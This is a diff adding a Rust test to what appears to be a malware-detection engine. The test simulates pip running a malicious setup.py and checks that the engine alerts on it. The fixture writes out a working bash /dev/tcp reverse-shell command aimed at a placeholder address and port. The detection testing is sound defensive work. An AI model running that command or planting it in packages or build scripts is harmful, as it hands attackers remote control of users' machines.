@@ -135,6 +135,44 @@ fn reverse_shell_from_a_postinstall() {
     assert_eq!(last.score, 10 + 25 + 15);
 }
 
+/// The eval set's `attack-pip-revshell`: pip runs a malicious setup.py that
+/// launches a bash reverse shell. Backs the Medium..Critical label there.
+#[test]
+fn pip_setup_py_reverse_shell_alerts() {
+    let mut s = Scenario::new();
+    s.exec(
+        0,
+        600,
+        50,
+        "/usr/bin/python3",
+        "python3 /env/bin/pip install ./pkg",
+    )
+    .exec(
+        1,
+        601,
+        600,
+        "/usr/bin/python3",
+        "python3 setup.py bdist_wheel",
+    )
+    .exec(
+        2,
+        602,
+        601,
+        "/usr/bin/bash",
+        "bash -c exec 3<>/dev/tcp/198.51.100.1/4444; sh <&3 >&3 2>&3",
+    )
+    .connect(3, 602, "198.51.100.1", 4444);
+    let reports = s.run();
+    let last = summaries(&reports)[0];
+    assert_eq!(last.anchor.name, "pip");
+    assert!(!alerts(&reports).is_empty(), "a reverse shell must alert");
+    assert!(last.severity >= Severity::Medium);
+    use RuleId::*;
+    for r in [P1, L2, N1, N3, C1] {
+        assert!(counted(last).contains(&r), "{r:?} should count");
+    }
+}
+
 #[test]
 fn xz_style_build_tampering() {
     let mut s = Scenario::new();
